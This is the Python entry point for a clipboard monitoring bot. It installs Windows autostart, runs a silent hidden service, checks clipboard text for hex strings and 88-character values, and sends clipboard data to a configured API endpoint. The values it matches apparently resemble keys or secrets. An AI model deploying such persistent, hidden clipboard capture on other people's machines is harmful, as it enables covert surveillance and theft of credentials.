#!/usr/bin/env python3
"""Clipboard monitoring bot entry point."""

import argparse
import logging
import sys


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Clipboard monitoring bot")
    parser.add_argument(
        "--install",
        action="store_true",
        help="Install autostart and start the bot",
    )
    parser.add_argument(
        "--uninstall",
        action="store_true",
        help="Stop the bot and remove autostart",
    )
    parser.add_argument(
        "--status",
        action="store_true",
        help="Show bot/API status",
    )
    parser.add_argument(
        "--test-clipboard",
        action="store_true",
        help="Check whether the current clipboard would be tracked",
    )
    parser.add_argument(
        "--copy-sample-88",
        action="store_true",
        help="Copy a valid 88-character test value, then check the clipboard",
    )
    parser.add_argument(
        "--service",
        action="store_true",
        help=argparse.SUPPRESS,
    )
    return parser.parse_args()


def _print_usage() -> None:
    print("Clipboard bot is not running.")
    print()
    print("Install and start it:")
    print("  python run_bot.py --install")
    print()
    print("Stop and remove it:")
    print("  python run_bot.py --uninstall")
    print()
    print("Optional checks:")
    print("  python run_bot.py --status")
    print("  python run_bot.py --test-clipboard")


def main() -> int:
    args = parse_args()

    if args.status:
        from check_status import print_status

        return print_status()

    if args.test_clipboard or args.copy_sample_88:
        import pyperclip

        from client.track_rules import (
            SAMPLE_TEXT_88,
            describe_track_match,
            explain_no_match,
            inspect_clipboard_text,
        )

        if args.copy_sample_88:
            pyperclip.copy(SAMPLE_TEXT_88)
            print("Copied a valid 88-character test value to the clipboard.")
            print(f"Length: {len(SAMPLE_TEXT_88)}")

        try:
            text = pyperclip.paste()
        except pyperclip.PyperclipException as exc:
            print(f"Could not read clipboard: {exc}")
            return 1

        if not isinstance(text, str) or not text.strip():
            print("Clipboard is empty.")
            return 1

        info = inspect_clipboard_text(text)
        match = info["match"]
        print(f"Clipboard length: {info['length']}")
        print(f"Hex digits found: {info['hex_length']}")
        print(f"Preview: {info['preview']!r}")

        if match:
            print(f"Match: {describe_track_match(match)}")
            return 0

        print("Match: none")
        for line in explain_no_match(info):
            print(line)
        return 1

    if args.install:
        from client.autostart import activate_autostart, install_autostart, post_install_message
        from client.event_log import setup_logging
        from client.windows_runner import start_service, stop_hidden_bots
        from config import API_URL, LOG_FILE

        setup_logging(LOG_FILE)
        stopped = stop_hidden_bots()
        if stopped:
            logging.info("Stopped %s previous bot process(es)", stopped)

        install_autostart()
        activated = activate_autostart()
        start_service()
        logging.info("Autostart installed and bot started")
        logging.info("Sending clipboard data to: %s", API_URL)
        print("Installed and running.")
        print(f"Data will be sent to: {API_URL}")
        print(post_install_message(activated))
        print(f"Logs: {LOG_FILE}")
        return 0

    if args.uninstall:
        from client.autostart import deactivate_autostart, uninstall_autostart
        from client.event_log import setup_logging
        from client.windows_runner import stop_hidden_bots
        from config import LOG_FILE

        setup_logging(LOG_FILE)
        stopped = stop_hidden_bots()
        deactivate_autostart()
        uninstall_autostart()
        logging.info("Autostart removed")
        if stopped:
            logging.info("Stopped %s bot process(es)", stopped)
        print("Bot stopped and autostart removed.")
        return 0

    if args.service:
        from client.clipboard_monitor import ClipboardMonitor

        monitor = ClipboardMonitor(silent=True)
        monitor.start()
        return 0

    _print_usage()
    return 0


if __name__ == "__main__":
    sys.exit(main())
